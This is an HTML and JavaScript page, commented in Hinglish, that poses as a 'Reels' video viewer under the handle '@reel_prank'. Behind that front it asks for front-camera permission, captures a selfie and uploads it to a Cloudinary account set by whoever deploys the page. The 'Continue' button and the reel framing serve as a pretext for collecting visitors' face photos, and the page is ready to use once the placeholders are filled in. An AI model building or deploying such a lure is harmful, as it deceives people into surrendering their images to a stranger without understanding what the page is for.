<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

<title>Reels</title>

<style>
* {
  box-sizing: border-box;
}

html, body {
  margin: 0;
  padding: 0;
  width: 100%;
  height: 100%;
  background: #000;
  color: white;
  font-family: Arial, sans-serif;
}

.reel {
  position: relative;
  width: 100%;
  max-width: 480px;
  height: 100vh;
  margin: auto;
  overflow: hidden;
  background: #000;
}

#reelVideo {
  width: 100%;
  height: 100%;
  object-fit: cover;
}

.top {
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  padding: 18px;
  display: flex;
  justify-content: space-between;
  font-size: 20px;
  text-shadow: 0 2px 5px #000;
}

.bottom {
  position: absolute;
  left: 0;
  right: 0;
  bottom: 0;
  padding: 30px 18px;
  background: linear-gradient(
    transparent,
    rgba(0,0,0,.9)
  );
}

button {
  border: none;
  border-radius: 10px;
  padding: 13px 20px;
  margin-top: 8px;
  font-size: 16px;
  font-weight: bold;
  cursor: pointer;
}

#continueBtn,
#uploadBtn {
  background: white;
  color: black;
}

#takeBtn {
  background: #fff;
  color: #000;
}

#camera,
#preview {
  display: none;
  position: absolute;
  inset: 0;
  background: #000;
  z-index: 10;
  align-items: center;
  justify-content: center;
  flex-direction: column;
}

#cam {
  width: 100%;
  height: 72%;
  object-fit: cover;
}

#photo {
  width: 90%;
  max-height: 65%;
  object-fit: contain;
}

.info {
  text-align: center;
  padding: 15px 25px;
  font-size: 13px;
  line-height: 1.5;
}

#status {
  margin-top: 10px;
  font-size: 13px;
}
</style>
</head>

<body>

<div class="reel">

  <!-- Tumhari Reel -->
  <video
    id="reelVideo"
    src="1000005836.mp4"
    autoplay
    muted
    loop
    playsinline>
  </video>

  <div class="top">
    <b>Reels</b>
    <span>♡</span>
  </div>

  <div class="bottom">

    <b>@reel_prank</b>

    <p>Watch this Reel 😄</p>

    <button id="continueBtn">
      Continue
    </button>

    <div id="status"></div>

  </div>


  <!-- CAMERA SCREEN -->

  <div id="camera">

    <video
      id="cam"
      autoplay
      playsinline>
    </video>

    <div class="info">
      📸 Camera permission is required.<br>
      Photo capture karne ke liye
      <b>Take Photo</b> dabayein.
    </div>

    <button id="takeBtn">
      Take Photo
    </button>

  </div>


  <!-- PHOTO PREVIEW -->

  <div id="preview">

    <img id="photo">

    <div class="info">
      Photo capture ho gayi hai.<br>
      Upload karne ke liye neeche
      <b>Upload Photo</b> dabayein.
    </div>

    <button id="uploadBtn">
      Upload Photo
    </button>

    <button id="retakeBtn">
      Retake
    </button>

  </div>

</div>


<script>

// ================================
// CLOUDINARY SETTINGS
// ================================

const CLOUD_NAME = "YOUR_CLOUD_NAME";

const UPLOAD_PRESET = "YOUR_UPLOAD_PRESET";


// ================================
// ELEMENTS
// ================================

const continueBtn =
  document.getElementById("continueBtn");

const camera =
  document.getElementById("camera");

const cam =
  document.getElementById("cam");

const takeBtn =
  document.getElementById("takeBtn");

const preview =
  document.getElementById("preview");

const photo =
  document.getElementById("photo");

const uploadBtn =
  document.getElementById("uploadBtn");

const retakeBtn =
  document.getElementById("retakeBtn");

const status =
  document.getElementById("status");

let stream = null;
let photoData = null;


// ================================
// CAMERA PERMISSION
// ================================

continueBtn.addEventListener("click", async () => {

  status.textContent =
    "Camera permission maangi ja rahi hai...";

  try {

    stream =
      await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: "user"
        },
        audio: false
      });

    cam.srcObject = stream;

    camera.style.display = "flex";

    status.textContent = "";

  } catch (error) {

    status.textContent =
      "Camera permission allow nahi hui.";

    console.error(error);
  }

});


// ================================
// TAKE PHOTO
// ================================

takeBtn.addEventListener("click", () => {

  if (!cam.videoWidth) {
    alert("Camera ready nahi hai.");
    return;
  }

  const canvas =
    document.createElement("canvas");

  canvas.width = cam.videoWidth;
  canvas.height = cam.videoHeight;

  const ctx =
    canvas.getContext("2d");

  ctx.drawImage(
    cam,
    0,
    0,
    canvas.width,
    canvas.height
  );

  photoData =
    canvas.toDataURL(
      "image/jpeg",
      0.85
    );

  photo.src = photoData;

  camera.style.display = "none";

  preview.style.display = "flex";


  // Camera band
  if (stream) {

    stream.getTracks().forEach(track => {
      track.stop();
    });

    stream = null;
  }

});


// ================================
// UPLOAD TO CLOUDINARY
// ================================

uploadBtn.addEventListener("click", async () => {

  if (!photoData) {
    alert("Pehle photo capture karo.");
    return;
  }

  uploadBtn.disabled = true;

  uploadBtn.textContent =
    "Uploading...";

  try {

    const formData =
      new FormData();

    formData.append(
      "file",
      photoData
    );

    formData.append(
      "upload_preset",
      UPLOAD_PRESET
    );


    const response =
      await fetch(
        `https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`,
        {
          method: "POST",
          body: formData
        }
      );


    const result =
      await response.json();


    if (!response.ok) {
      throw new Error(
        result.error?.message ||
        "Upload failed"
      );
    }


    status.textContent =
      "Photo successfully uploaded.";

    uploadBtn.textContent =
      "Uploaded ✓";


    console.log(
      "Cloudinary image:",
      result.secure_url
    );


  } catch (error) {

    console.error(error);

    status.textContent =
      "Upload failed: " +
      error.message;

    uploadBtn.disabled = false;

    uploadBtn.textContent =
      "Upload Photo";
  }

});


// ================================
// RETAKE
// ================================

retakeBtn.addEventListener("click", async () => {

  preview.style.display = "none";

  try {

    stream =
      await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: "user"
        },
        audio: false
      });

    cam.srcObject = stream;

    camera.style.display = "flex";

  } catch (error) {

    alert(
      "Camera permission required."
    );

  }

});

</script>

</body>
</html>
